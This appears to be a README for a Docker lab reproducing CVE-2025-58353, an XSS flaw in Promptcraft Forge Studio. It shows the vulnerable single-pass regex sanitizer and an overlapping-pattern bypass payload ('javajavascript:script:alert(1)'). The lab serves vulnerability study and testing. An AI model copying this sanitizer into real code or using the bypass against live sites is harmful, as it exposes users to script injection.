# CVE-2025-58353 - Promptcraft Forge Studio XSS via Sanitizer Bypass

## Vulnerability Overview

Promptcraft Forge Studio uses regex-based input sanitization that can be bypassed using overlapping patterns.

## Environment Setup

### Prerequisites
- Docker and Docker Compose

### Start the Environment

```bash
docker-compose up -d --build
```

Wait for the build to complete. The application will be available at:
- http://localhost:18080

### Verify the Environment

Check if the container is running:
```bash
docker-compose ps
```

## Vulnerability Details

The vulnerable code is in `src/utils/validation.ts`:

```typescript
.replace(/javascript:/gi, '')
.replace(/on\w+\s*=/gi, '')
.replace(/data:text\/html/gi, '')
```

Since replacements are applied only once, overlapping patterns bypass the sanitization:
- Input: `javajavascript:script:alert(1)`
- After sanitize: `javascript:alert(1)` (still dangerous)

## Stop the Environment

```bash
docker-compose down
```
